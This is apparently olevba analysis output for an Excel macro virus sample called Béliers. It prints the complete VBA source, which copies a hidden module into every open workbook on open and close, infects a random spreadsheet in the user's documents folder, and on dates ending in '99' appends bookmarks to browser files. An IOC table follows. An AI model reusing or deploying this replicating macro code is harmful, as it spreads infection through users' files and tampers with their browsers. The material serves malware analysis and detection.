olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Béliers.bas 
in file: Virus.MSExcel.Beliers-7d9f16198e1aec17db0f5184d6e562b2279a6128 - OLE stream: '_VBA_PROJECT_CUR/VBA/Béliers'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ************************************************************************************************

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"

On Error Resume Next

If Right(Date, 2) = "99" Then action

fichiercourant = ActiveWorkbook.Name
    
For a = 1 To Workbooks.Count
 nbfeuilles = Workbooks(a).Sheets.Count
 ecrit = True
 For b = 1 To nbfeuilles
   If Workbooks(a).Sheets(b).Name = "Béliers" Then
    ecrit = False
   End If
 Next b
 If ecrit Then
  Workbooks(fichiercourant).Modules("Béliers").Copy after:=Workbooks(a).Sheets(nbfeuilles)
  Workbooks(a).Sheets("Béliers").Visible = False
  Workbooks(a).Sheets(1).Select
 End If
Next a
   
Workbooks(fichiercourant).Activate
ecrit_fichier

End Sub
  
Rem ************************************************************************************************

Sub Auto_close()
Attribute Auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
    
On Error Resume Next

fichiercourant = ActiveWorkbook.Name
    
For a = 1 To Workbooks.Count
 nbfeuilles = Workbooks(a).Sheets.Count
 ecrit = True
 For b = 1 To nbfeuilles
   If Workbooks(a).Sheets(b).Name = "Béliers" Then
    ecrit = False
   End If
 Next b
 If ecrit Then
  Workbooks(fichiercourant).Modules("Béliers").Copy after:=Workbooks(a).Sheets(nbfeuilles)
  Workbooks(a).Sheets("Béliers").Visible = False
  Workbooks(a).Sheets(1).Select
 End If

Next a
   
Workbooks(fichiercourant).Activate
ecrit_fichier
   
End Sub

Rem ************************************************************************************************
Sub ecrit_fichier()
Attribute ecrit_fichier.VB_ProcData.VB_Invoke_Func = " \n14"

On Error Resume Next

fichiercourant = ActiveWorkbook.Name
chemincourant = CurDir()

ChDrive "c"
ChDir ("c:\mes Documents")
fichier = Dir("*.xls")

n = 1

Do While fichier <> ""
  n = n + 1
  fichier = Dir()
Loop

b = Int(n * Rnd)
b = b - 1

ChDrive "c)"
ChDir ("c:\Mes Documents")
fichier = Dir("*.xls")

For a = 1 To b
 fichier = Dir()
Next a

If (fichier <> fichiercourant) And (fichier <> "") Then
 Workbooks.Open (fichier)
 feuillecourante = Workbooks(fichier).ActiveSheet.Name
 nbfeuilles = Workbooks(fichier).Sheets.Count
 ecrit = True
 
 For b = 1 To nbfeuilles
   If Workbooks(fichier).Sheets(b).Name = "Béliers" Then
    ecrit = False
   End If
 Next b
 
 If ecrit Then
  Workbooks(fichiercourant).Sheets("Béliers").Copy after:=Workbooks(fichier).Worksheets(nbfeuilles)
  Workbooks(fichier).Sheets("Béliers").Visible = False
  Workbooks(fichier).Sheets(feuillecourante).Select
 End If
 
 Workbooks(fichier).Save
 Workbooks(fichier).Close
End If

ChDrive (chemincourant)

End Sub

Rem ************************************************************************************************

Sub action()
Attribute action.VB_ProcData.VB_Invoke_Func = " \n14"

On Error Resume Next

Open "c:\Program files\netscape\navigator\program\bookmark.htm " For Append As #1
 Print #1, "    <DT><A HREF=""http://groupebelier/"" ADD_DATE=""890674206"" LAST_VISIT=""896388845"" LAST_MODIFIED=""890674114"">Groupe Bélier</A>"
Close #1

Open "c:\Program files\netscape\navigator\bookmark.htm " For Append As #1
 Print #1, "    <DT><A HREF=""http://groupebelier/"" ADD_DATE=""890674206"" LAST_VISIT=""896388845"" LAST_MODIFIED=""890674114"">Groupe Bélier</A>"
Close #1

Open "c:\windows\Favoris\Groupe Bélier.url" For Append As #1
 Print #1, "[InternetShortcut]"
 Print #1, "URL=http://www.groupebelier.ch"
Close #1

End Sub

Rem ************************************************************************************************
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Bélier
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.groupebel|URL                                          |
|          |ier.ch              |                                             |
+----------+--------------------+---------------------------------------------+

